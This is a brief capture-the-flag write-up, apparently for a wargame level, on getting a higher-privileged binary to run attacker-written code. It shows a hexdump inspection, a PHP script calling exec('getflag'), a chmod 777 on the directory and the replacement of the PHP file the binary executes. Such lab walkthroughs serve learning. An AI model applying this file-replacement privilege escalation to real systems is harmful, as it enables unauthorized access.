# Find the password of Flag06

## First check :
Home directory : \[✓\] not empty.
We found 2 files:
- PHP file
- executable file

## Binary ? hexdump ! :

`hexdump ./level06 -C`
The hexdump showed us that the `./level06` binary executes the file `level06.php`

Let's create our `/tmp/level06.php` maybe ?

```
#!/usr/bin/php

<?php
echo exec('getflag');
?>

```

...
...
...

```
chmod 777 .
mv /tmp/level06.php .
./level06
```

## TADAAAAAAA, It's ... 
[The next level flag](https://github.com/XD-OB/snowcrash/blob/master/level06/flag)

_tobecontinued_